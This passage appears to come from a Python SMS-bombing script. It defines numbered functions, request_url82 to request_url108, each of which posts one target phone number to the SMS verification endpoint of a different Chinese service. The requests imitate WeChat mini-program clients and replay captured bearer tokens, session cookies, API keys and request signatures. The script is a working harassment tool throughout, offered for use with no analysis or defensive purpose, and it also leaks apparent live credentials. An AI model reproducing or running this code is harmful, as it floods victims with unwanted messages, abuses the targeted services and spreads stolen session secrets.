        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx926351fe1862b17f/149/page-frame.html"
    }
    data82 = {"phoneNumber": phone}

    response82 = requests.post(url82, headers=headers82, json=data82)

def request_url83():
    url83 = "https://app.nahuomall.com/vshop-pop/mp-auth-verify/"
    headers83 = {
        "nh-agent-id": "1",
        "nh-req-time": "1718124707000",
        "content-type": "application/x-www-form-urlencoded",
        "nh-auth-code": "2e37065b71c5772027966021f45c1233",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxe635336adfb0384f/650/page-frame.html"
    }
    data83 = {
        "mobile_no": phone
    }

    response83 = requests.post(url83, headers=headers83, data=data83)

def request_url84():
    url84 = "https://wxm-api.freshfans.cn/amc/auth/phoneSms?phone=" + phone
    headers84 = {
        "Host": "wxm-api.freshfans.cn",
        "Connection": "keep-alive",
        "xf-merchant": "6",
        "content-type": "application/json",
        "Authorization": "bearer ab45420a-cbcf-4e08-89ba-586f2db808c6",
        "xf-mini-appid": "wxc154964b8495dda5",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxc154964b8495dda5/59/page-frame.html"
    }

    response84 = requests.get(url84, headers=headers84)

def request_url85():
    url85 = "https://dsappapi.liancaiwang.cn/index.php/webapi/smssend"
    headers85 = {
        "request-from": "wx",
        "mec-type": "",
        "content-type": "application/json;charset:utf-8",
        "token": "",
        "Authorization": "APPCODE 068ff082d41547cc82cc58881e737440",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx1e590e6b1dcabe60/90/page-frame.html"
    }
    data85 = {
        "mobile": phone,
        "mec-type": "5"
    }

    response85 = requests.post(url85, headers=headers85, json=data85)

def request_url86():
    url86 = "https://bmp-app.herbalifeonline.cn/api/user/web/bmp/sendSmsCode?mobile=" + phone
    headers86 = {
        "Host": "bmp-app.herbalifeonline.cn",
        "Connection": "keep-alive",
        "cookie": "acw_tc=2f624a6017181276531765067e5d71f07b1e8c2bcb29386ed511177a3e26dd; guestId=362847b5-bd08-4f0a-9a28-005cc791321d; guestId.sig=xNacK2-wF2Wnnk7fhFE1_L9SYvQ; SESSION=NDFlODY1NjctNzdmYi00NmMwLWFhODEtMDExMzYyZTJhOTU1",
        "Accept": "application/json",
        "x-requested-with": "XMLHttpRequest",
        "content-type": "application/json",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxc3be7f81938b1fe9/218/page-frame.html"
    }

    response86 = requests.get(url86, headers=headers86)

def request_url87():
    url87 = "https://xcx.dazhang.net.cn/miniapp/member/sendsmscode"
    headers87 = {
        "Host": "xcx.dazhang.net.cn",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "X-ZZ-Timestamp": "1718130776938",
        "X-ZZ-Device-Version": "iPhone 11<iPhone12,1>,iOS 14.7",
        "X-ZZ-Wechat-Version": "8.0.48",
        "v": "1.0.34",
        "X-ZZ-Open-Id": "okzjo4jQEJrlWsEnVikGDyHplndw",
        "MINIAPP-Authorization": "",
        "X-ZZ-Device-AppId": "wxfd4c9d73e5d0cc15",
        "X-ZZ-Device-Type": "wechat",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxfd4c9d73e5d0cc15/21/page-frame.html"
    }
    data87 = {
            "sign": 'c58c12bd2f880e09160e7dea0692e736',
            "phone": phone,
            "type": "1",
            "nonce": "YYYuj1Pjq2JOtCOfsUfF"
        }

    response = requests.get(url87, headers=headers87, params=data87)

def request_url88():
    url88 = "https://wechat.banggongshe.cn/api/sms/registrationSms"
    headers88 = {
        "Host": "wechat.banggongshe.cn",
        "Connection": "keep-alive",
        "Content-Length": "118",
        "content-type": "application/json",
        "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjRBMjM5RjREREEyODdCQzg0OTQ5MTU3NzBEODk2QzcyIiwidHlwIjoiYXQrand0In0.eyJuYmYiOjE3MTgxNjc5MDEsImV4cCI6MTcxODE3MTUwMSwiaXNzIjoiaHR0cHM6Ly9pZC5iYW5nZ29uZ3NoZS5jbiIsImF1ZCI6WyJ0b2lua19zZWN1cml0eV9hcGkiLCJ0b2lua193ZWNoYXRfYWNjZXNzX2FwaSJdLCJjbGllbnRfaWQiOiJ0b2lua19zZWN1cml0eV9hcGlfZW1wdHkiLCJjbGllbnRfcm9sZSI6WyJTZWN1cml0eSIsIldlY2hhdEFjY2VzcyIsIkxvZ2lzdGljcyJdLCJqdGkiOiJBRUE1NzhBN0RBOUZDMjExRDFEQzJENzFGRUNDRTUyNiIsImlhdCI6MTcxODE2NzkwMSwic2NvcGUiOlsidG9pbmtfc2VjdXJpdHlfYXBpIiwidG9pbmtfd2VjaGF0X2FjY2Vzc19hcGkiXX0.r_e4KBwaGz4qI12mpx-r_pgpOOo4K2p_YjNT6EWv54y1HZLBh3jkpenu36EybStRXrEq7hj01x8TLZVDlpCVWLIQAQ_JIIfc-Ugln6rE3slgbeB0ZgoMz3RYizsXFHHaAkK-yOB_I74ouWnPDTwfIYbFjIkGRG_xKY-MdUXg4iuhZpEc7a-S4JCq_r2Z4_RL1ZTZPmWI19VXHk3R2c_kd1T4ovY6WmBgIgwXxq4iOxbrgeBYK5O6byfCXSZQJnVVRppqBONa0PKYPYyhkA3Sf5gJbBpmOAbkooxUroBML5kwHtNy_MXMuseFd26nYOUrxlgrYHtiHLRrzHmMcTwnww",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxfc79367059471d48/18/page-frame.html"
    }
    data88 = {
        "smsId": "6d53c159-66b6-4121-8e20-a6f8e96fb0c6",
        "phone": phone,
        "templateId": "71a15f5593614419afa8eb08d805ad48"
    }

    response88 = requests.post(url88, headers=headers88, json=data88)

def request_url89():
    url89 = "https://jinshuju.net/graphql/f/aGrHSi"
    headers89 = {
        "Host": "jinshuju.net",
        "tracestate": "868043@nr=0-1-868043-1134272420-f0d7246c8fc6fd23----1718169597242",
        "Accept": "*/*",
        "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6Ijg2ODA0MyIsImFwIjoiMTEzNDI3MjQyMCIsImlkIjoiZjBkNzI0NmM4ZmM2ZmQyMyIsInRyIjoiODBkMDY3NmQzMGY5MTk5M2EzZmQzNTkzYzY2YTFhNTkiLCJ0aSI6MTcxODE2OTU5NzI0Mn19",
        "Accept-Language": "zh-cn",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://jinshuju.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://jinshuju.net/f/aGrHSi",
        "Content-Length": "300",
        "Connection": "keep-alive",
        "x-csrf-token": "3QN_rjBQvVWWjolvJ_Fwt0X_-hBNq1IM5lKefUnPxAmFDsFfeQVEKAhoc4JJtOi6U6p09XooIrYqov467WJaMg",
        "traceparent": "00-80d0676d30f91993a3fd3593c66a1a59-f0d7246c8fc6fd23-01",
        "Cookie": "Hm_lpvt_47cd03e974df6869353431fe4f4d6b2f=1718169551; Hm_lvt_47cd03e974df6869353431fe4f4d6b2f=1718169551; _gd_session=ZnhaRWZ6a1l0WGRqU2srMWgreVBHN0VzcTNRalF0ekR0dExNNEJWY204UXBJRW9XcUpHa2RLNld4eWcxMnZEVzhTRmZPdWx6bWJvQUFPVFdGK3k0TFFmSmZZNUJMNkRQZXFnb3c2cjRiSmMwbWZrREYrMTBrQWFpcUFHaTc3cGZ3blhPVDRZQnNmek9wMlR5aXUrekNBPT0tLURwaGhCN0FhbmtuYnUxclh6TUNOS3c9PQ%3D%3D--51f36f0394565e32b34d1d3058cb060654d750b8; cid=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqSmxPRGhsWXpJMkxXWTJabVF0TkdVMllpMDRNR1l3TFdOaU5HSXdORGRtTjJSbVpDST0iLCJleHAiOiIyMDM0LTA2LTEyVDA1OjE5OjExLjM4NFoiLCJwdXIiOm51bGx9fQ%3D%3D--b69a0dcec18ab2700a091b50b3c077242622c4a4; csrf_token=3QN_rjBQvVWWjolvJ_Fwt0X_-hBNq1IM5lKefUnPxAmFDsFfeQVEKAhoc4JJtOi6U6p09XooIrYqov467WJaMg; jsj_uid=9e08d5b8-39b5-40d7-b215-e6980d292a28; start_filling_time_aGrHSi=1718169550"
    }
    data89 = [{"operationName": "CreateFieldVerification", "variables": {"input": {"fieldApiCode": "field_5", "formId": "aGrHSi", "mobile": phone, "captchaData": None, "geetest4Data": None}}, "extensions": {"persistedQuery": {"version": 1, "sha256Hash": "77e2c905d36069c91d2ea55e915a1916204393b04a632087d59001301e6f7f5b"}}}]


    response89 = requests.post(url89, json=data89, headers=headers89)

def request_url90():
    url90 = "https://passport.taopiaopiao.com/newlogin/sms/send.do?_bx-ua=303$bK2E95b8leg993ACIxzpSGhYz2qvqmhJq7ZmzqhzFtfatTaTzs4Hn2M6LgF8g/dNObxoP0foUvcDpd3j/i4cii33lfr3pIvfUM6dabWGGdcYJJxrxePnvdJd2m4qg5vYHfS7sJWDmvKftjLpbqzorfv6557w//haPQh3ue8eJ/hw0xtuaGC9gz6/OgOSayMhffviuFjAPMy+X/0KmHwlSdAFGHiNBZQoVKGrUHndtOKaN3Upq8v7KsmE20hJte6vx7OEUJwtKq0B4pQrqBaa7fuPRdj6n0+HOC9Zw3OY/r56Gt1gmQ1Ay5v3bMljn50ma2B1NTzCqLJEMPe4ijV7tRXkX10HEQkkpuOZO5OAEswG6U0n7ZAp20AX6P2eNrcF1Y63aPHLcrKw9J7p1VFVoYiEQTCVvErB9AkYKsQji9Yuh9j9Eaq4WIecQqjYYrb52tb/JvePto8KHDVFfPbikT4sfwHArF1AlCS/aWH5GMB3iFQQrZiThew0nHrr8sFlVg8cBJEC8bB7/3eSPeYAoiX8XP3b/mlXjUtZz3C4lZTCZudItuZoVqVF7zsDJbXGNp4+GoDnnhTmmdQNF/jdqhw9YPRz46Q9XD9Dvct0IYInV8LRabvhxE9K/WAaIaATi5anHqVsJ6TVaaauKJ/AUAgwLjpgO7p8QYM04I9t8ArejRhuMySynM0BpeHUaBrvnak1EGP1E+iTrFfKwym4fd/Oe8SOORgdjawbTv7xQDwZCHSbDaOT0KVwnu+n7V6XS8hkimnBNTTYed0DiZ10Ud/dGF50HtedcNHqOWOgy2t2H85JbJsWzb48G4IL6A9kR3KM4qCUE0We95KARtP2S110eiW+td/ArTH12NojVWxZb=="
    headers90 = {
        "Host": "passport.taopiaopiao.com",
        "Connection": "keep-alive",
        "Content-Length": "401",
        "mini-janus": "10%40sDT4gfWmWzjocv1S_Fqzxg6Y9_epk%2B%2BZ%2F8JigyqY%3D",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "x-ticid": "AW5qBrjylG8WTvQT6F_ys8n22KwCwzLtug1g8x66FjlKEjy9ndQBmhTDNhloxiqB_Atb5dck_Yn9U5FsplRekcybo_Wg",
        "bx-umidtoken": "S2gAzZfBESeKGCIM_p8yiOOS_4FTiwcgeLfrU_1f0t4NlUqBzWBQ7KIU6TZuQl0hhBa352YW2R6zEs2RNSCCtfdI",
        "Referer": "https://servicewechat.com/wx553b058aec244b78/94/page-frame.html",
        "Cookie": "_hc.v=eb13b40c-cbe1-4b72-8ed3-cb2321e2e379.1664207777; _lxsdk_cuid=1809fc24140c8-0a4e19f1d95336-6313f67-1fa400-1809fc2414132; _lxsdk=1809fc24140c8-0a4e19f1d95336-6313f67-1fa400-1809fc2414132; _hc.ln=language:zh-CN; _hc.sr=1440*3040; _hc.si=cae77070-b9ba-4c55-8ef7-5b1dda7f9b66.1664207777; _hc.sh=1440*3040; _hc.d=1664207777; _hc.ct=1664207777; _hc.uid=cae77070-b9ba-4c55-8ef7-5b1dda7f9b66.1664207777; _hc.vid=eb13b40c-cbe1-4b72-8ed3-cb2321e2e379.1664207777; _hc.sid=cae77070-b9ba-4c55-8ef7-5b1dda7f9b66.1664207777; _hc.dp=1; _hc.t=1664207777"
    }
    data90 = [{"type": "weixin_mini_program", "appId": "undefined", "appName": "taopiaopiao", "isMobile": True, "appEntrance": "mp_bind", "nativeMp": True, "phoneCode": "86", "countryCode": "CN", "bizParams": "tokenType%3DsnsBind%26token%3DCN-SPLIT-ARDgywYiDWhhdmFuYV9tbG9naW4qD3Nuc19yZWdfb3JfYmluZDIBATjesbbXgDJAAUoQ4Gvi37sNZDw4EQdT7o3IyzUC_qZW2-99K__pob8aEdIEoYfM&sdkTraceId=b33a72c6-ff7b-46a0-a921-69a40bd71567", "loginId": phone, "pageId": "PHONE_NUMBER_INPUT_PAGE"}]

    response90 = requests.post(url90, json=data90, headers=headers90)

def request_url91():
    url91 = "https://api.hengdianfilm.com/common/send_mb_code"
    headers91 = {
        "Host": "api.hengdianfilm.com",
        "Connection": "keep-alive",
        "Content-Length": "42",
        "Shop-Mixid": "9999",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxcd65f9f890687c99/128/page-frame.html"
    }
    data91 = {"mobilephone": phone, "sendType": 2}

    response91 = requests.post(url91, json=data91, headers=headers91)

def request_url92():
    url92 = "https://www.luzhou12345.cn/app12345wbs.asmx/getInfo"
    headers92 = {
        "Host": "www.luzhou12345.cn",
        "Connection": "keep-alive",
        "Content-Length": "80",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx218d959b2ebd15a7/14/page-frame.html"
    }
    data92 = {"AcceptType": "sendwritevercode", "AcceptContent": f'{{"Mobile":"{phone}"}}'}

    response92 = requests.post(url92, json=data92, headers=headers92)

def request_url93():
    url93 = "https://www.hylyljk.com/ymm-common/sms/sendSmsCode"
    headers93 = {
        "Host": "www.hylyljk.com",
        "Connection": "keep-alive",
        "Content-Length": "23",
        "content-type": "application/json",
        "userType": "1",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx7edcedb080ff0cf0/84/page-frame.html"
    }
    data93 = {"phone": phone}

    response93 = requests.post(url93, json=data93, headers=headers93)

def request_url94():
    url94 = "https://bg.84185858.com/index.php?m=Home&c=Login&a=sendVerifyCode"
    headers94 = {
        "Host": "bg.84185858.com",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "zh-cn",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://bg.84185858.com",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
        "Connection": "keep-alive",
        "Referer": "https://bg.84185858.com/index.php?m=Home&c=Login&a=register",
        "Cookie": "06e871386a38df995a907317683d15a8=c40d01c1f69d4868a5295c69ab1a02bb; PHPSESSID=04bc791493549f87c522ffbc2d1e50a6; Hm_lpvt_7cfa4efb3192b4708af6e94e6f396b1c=1718172205; Hm_lvt_7cfa4efb3192b4708af6e94e6f396b1c=1718172205; __mq_cookie_key__=12345"
    }
    data94 = {"mobile": phone}

    response94 = requests.post(url94, data=data94, headers=headers94)

def request_url95():
    url95 = "https://b.aifabu.com/v1/setSmsCode"
    headers95 = {
        "Host": "b.aifabu.com",
        "Content-Type": "application/json",
        "Origin": "https://www.aifabu.com",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
        "Referer": "https://www.aifabu.com/mregister",
        "Accept-Language": "zh-cn"
    }
    data95 = {"phone": phone, "type": 1}

    response95 = requests.post(url95, json=data95, headers=headers95)

def request_url96():
    url96 = "https://api2.ehuoyun.com/rest/v1/members/verify-code"
    headers96 = {
        "Host": "api2.ehuoyun.com",
        "Connection": "keep-alive",
        "Content-Length": "29",
        "Authorization": "Bearer 1717069575256a2e4dd0462daa302872003bf49100cb1",
        "content-type": "application/json",
        "Site": "PET",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx2a270649a62516f8/26/page-frame.html"
    }
    data96 = {"phoneNumber": phone}

    response96 = requests.post(url96, headers=headers96, json=data96)

def request_url97():
    url97 = "https://minicap.caocaokeji.cn/passport/getSmsCode/1.0"
    headers97 = {
        "Host": "minicap.caocaokeji.cn",
        "Connection": "keep-alive",
        "Content-Length": "355",
        "content-type": "application/x-www-form-urlencoded",
        "ctag": '{"shumeidid":""}',
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxe9617ab1feb5f0ca/255/page-frame.html"
    }
    data97 = {
        "clientType": 4,
        "appVersion": "10.61.3",
        "version": "10.61.3",
        "tt": "6669615fOPAFyrDZ9GC3RCO1CCHp8EPrtETU7Du4",
        "origin": 12,
        "deviceId": "",
        "customerDeviceId": "",
        "appCode": "54Z6H270SDMO",
        "userType": 1,
        "appType": "WeChatCarApp",
        "accountType": "phone",
        "accountValue": phone,
        "authType": "sms",
        "lg": "140.33470745899146",
        "lt": "37.491017710754086",
        "shumeidid": "",
        "timestamp": 1718182266805,
        "sign": "EFF2468A92FAF3112A3FD75095EF1F86"
    }

    response97 = requests.post(url97, headers=headers97, data=data97)

def request_url99():
    url99 = "https://api.miaozo.com/app/sms/v2/login"
    headers99 = {
        "Host": "api.miaozo.com",
        "Connection": "keep-alive",
        "Content-Length": "153",
        "ApplicationVersion": "6.4.4",
        "PhoneModel": "iPhone 11<iPhone12,1>,iOS 14.7",
        "content-type": "application/json",
        "WechatVersion": "8.0.48,3.3.5",
        "ApplicationSource": "miniPrograme",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx983bc7fc0880eb68/278/page-frame.html"
    }
    data99 = {
        "cellphone": phone,
        "client": {
            "timestamp": 1718183588,
            "identity": "ec66fd8d-105d-4dab-936d-eee301ce25ad",
            "sign": "5025d5b62cc7857f3ee6b66d679f405c"
        }
    }

    response99 = requests.post(url99, headers=headers99, data=json.dumps(data99))

def request_url100():
    url100 = "https://api.saicmobility.com/cas/v2/mobile/sendmobileauthcode"
    headers100 = {
        "Host": "api.saicmobility.com",
        "Connection": "keep-alive",
        "Content-Length": "87",
        "content-type": "application/json",
        "X-Saic-Platform": "wxmp",
        "X-Saic-LoginChannel": "3",
        "X-Saic-Device-Id": "2ececf17a81bf13923fd7c9273656d15",
        "X-Saic-CityCode": "310100",
        "uid": "",
        "X-MerchantId": "saic_car",
        "X-Saic-ProductId": "1",
        "X-Saic-AppId": "saic_car",
        "X-Saic-App-Version": "3.0.0",
        "X-Saic-CurrentTimeZone": "UTC+8",
        "X-Saic-Real-App-Version": "4.11",
        "X-Saic-Finger": "e6c1108a-5a27-4ae0-8ab6-d97588dc0f7e",
        "X-Saic-Req-Ts": "1718184226305",
        "X-Saic-Channel": "saicwx",
        "X-Saic-Gps": "140.33470745899146,37.491017710754086",
        "X-Saic-Location-CityCode": "310100",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx3207ea5333ed52dc/139/page-frame.html"
    }
    data100 = {
        "mobile": phone,
        "userType": 1,
        "templateCode": "0002",
        "smsType": 0,
        "source": "wxmp"
    }

    response100 = requests.post(url100, headers=headers100, data=json.dumps(data100))

def request_url101():
    url101 = "https://www.hylyljk.com/ymm-common/sms/sendSmsCode"
    headers101 = {
        "Content-Type": "application/json",
        "UserType": "1",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx7edcedb080ff0cf0/84/page-frame.html"
    }
    data101 = {"phone": phone}

    response101 = requests.post(url101, headers=headers101, data=json.dumps(data101))

def request_url102():
    url102 = "https://u.letfungo.com/api/app/user/ebikeUsers/registerSendSMS"
    headers102 = {
        "Content-Type": "application/x-www-form-urlencoded",
        "op-lang": "zh-Hans",
        "app-phone-version": "iOS 14.7",
        "app-phone-style": "iPhone 11<iPhone12,1>",
        "platform": "ios",
        "uuid": "17183893235984919229",
        "app-lang": "",
        "aid": "",
        "mp-version": "8.0.48",
        "appid": "wx29861b332f0eb297",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx29861b332f0eb297/256/page-frame.html"
    }
    data102 = {
        "type": "1002",
        "act": "send",
        "phone": phone,
        "page_code": "aHpsZnwxNzE4Mzg5MzMwaHpsZjIwMTgO0O0O",
        "plat_id": "1",
        "token": "116231749b8325e998dc2e9c4dc8605a157c537f70dfe008df0e10458ebfcd6db881949c4f9772c37c25731ab667f804"
    }

    response102 = requests.post(url102, headers=headers102, data=data102)

def request_url103():
    url103 = "https://ddc.jiahengchuxing.com/account/account/sendRegisterCode?fromApi=miniapp"
    headers103 = {
        "Content-Type": "application/x-www-form-urlencoded",
        "token": "",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx997eeb950b7e0cfc/66/page-frame.html"
    }
    data103 = {"mobile": phone}

    response103 = requests.post(url103, headers=headers103, data=data103)

def request_url104():
    url104 = "https://esino.xtrunc.com/esino/api/user/phone_auth?3rd=0000*0000&tm=1718386573"
    headers104 = {
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxffcf13a198304d5b/2/page-frame.html"
    }
    data104 = {
        "3rdsession": "0000000000000000",
        "op": "sendsms",
        "phonenumber": phone,
        "code": "0e3Tpi0w3KJFX23HfI2w3jF25V3Tpi0N",
        "appid": "wxffcf13a198304d5b",
        "ver": "v2"
    }

    response104 = requests.post(url104, headers=headers104, data=json.dumps(data104))

def request_url105():
    url105 = "https://ride-platform.hellobike.com/api?saas.user.auth.sendCode"
    headers105 = {
        "Content-Type": "application/json",
        "nonce": "883727",
        "signature": "5ad8f3f0754caa92e62af53a1b55acabab3d0cac",
        "timestamp": "1718387466307",
        "systemCode": "226",
        "x-chaos-env": "pro-1.1.2",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx28d825793977e385/16/page-frame.html"
    }
    data105 = {
        "riskControlData": {},
        "version": "6.57.0",
        "releaseVersion": "6.57.0",
        "systemCode": "226",
        "appName": "AppHelloMiniBrand",
        "mobileModel": "iPhone 11<iPhone12,1>",
        "weChatVersion": "8.0.48",
        "mobileSystem": "iOS 14.7",
        "SDKVersion": "3.3.5",
        "systemPlatform": "ios",
        "from": "wechat",
        "CODE_ENV": "pro",
        "mobile": phone,
        "tenantId": "t_chn_ascx",
        "source": "0",
        "action": "saas.user.auth.sendCode"
    }

    response105 = requests.post(url105, headers=headers105, data=json.dumps(data105))

def request_url106():
    url106 = "https://api.xiaoantech.com/xcuser/v1/user/requestSmsCode"
    headers106 = {
        "accept": "application/json",
        "content-type": "application/json",
        "X-LC-Id": "6037536b17162e00016bcf6c",
        "X-LC-Session": "",
        "X-LC-Key": "LTAI4GLABNn7ngjVekkgx5m2",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxd1fd30eba3f80057/11/page-frame.html"
    }
    data106 = {"mobilePhoneNumber": phone}

    response106 = requests.post(url106, headers=headers106, data=json.dumps(data106))

def request_url107():
    url107 = "https://axq.beidouxh.cn/user-api/getPhoneCode"
    headers107 = {
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx16326cd757042bb1/89/page-frame.html"
    }
    data107 = {
        "phone": phone,
        "eventType": 12,
        "ver": "1.0.0",
        "plat": "weixin",
        "sys": "iphone",
        "imei": "123456789",
        "timestamp": 1718388614,
        "sign": "123456789abcd"
    }

    response107 = requests.post(url107, headers=headers107, data=json.dumps(data107))

def request_url108():
    url108 = "https://www.8341.top/sys/tabUser/sms"
    headers108 = {
